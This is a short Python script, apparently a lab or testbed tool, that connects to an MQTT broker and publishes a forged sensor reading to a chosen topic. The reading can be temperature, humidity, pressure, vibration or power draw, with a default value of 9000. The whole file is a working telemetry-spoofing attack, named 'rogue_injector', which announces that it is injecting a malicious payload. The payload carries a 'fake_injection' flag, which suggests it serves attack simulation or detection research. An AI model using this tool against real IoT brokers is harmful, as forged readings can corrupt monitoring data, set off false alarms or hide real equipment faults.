import paho.mqtt.client as mqtt
import time
import json
import argparse

VALID_SENSOR_TYPES = ("temperature", "humidity", "pressure", "vibration", "power_draw")
VALID_PROFILES = ("normal", "erratic", "failing")


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to broker!")
    else:
        print(f"Failed to connect, return code {rc}")


def _default_sensor_id(topic):
    """Extract sensor_id from last segment of topic path."""
    return topic.rstrip("/").split("/")[-1] if topic else "unknown"


# Module-level parser for testing
parser = argparse.ArgumentParser(description="MQTT Fake Telemetry Injection")
parser.add_argument("--broker", required=True, help="MQTT Broker IP/Hostname")
parser.add_argument("--port", type=int, default=1883, help="MQTT Broker Port")
parser.add_argument("--topic", default="sensors/data", help="Target topic")
parser.add_argument("--sensor-id", default=None, help="Sensor ID (default: last segment of --topic)")
parser.add_argument(
    "--sensor-type", default="temperature",
    choices=VALID_SENSOR_TYPES,
    help="Sensor type for readings key",
)
parser.add_argument("--value", type=int, default=9000, help="Fake sensor value to inject")
parser.add_argument(
    "--profile", default="normal",
    choices=VALID_PROFILES,
    help="Sensor behavior profile (tags the InfluxDB point)",
)

if __name__ == "__main__":
    args = parser.parse_args()

    sensor_id = args.sensor_id or _default_sensor_id(args.topic)
    payload = {
        "sensor_id": sensor_id,
        "profile": args.profile,
        "fake_injection": True,
        "readings": {args.sensor_type: args.value},
    }
    payload_str = json.dumps(payload)
    print(f"Injecting malicious payload to '{args.topic}': {payload_str}")

    client = mqtt.Client("rogue_injector")
    client.on_connect = on_connect

    print(f"Connecting to {args.broker}:{args.port}...")
    client.connect(args.broker, args.port, 60)
    client.loop_start()

    time.sleep(1)

    client.publish(args.topic, payload_str, qos=1)

    time.sleep(1)
    client.loop_stop()
    client.disconnect()
    print("Injection complete.")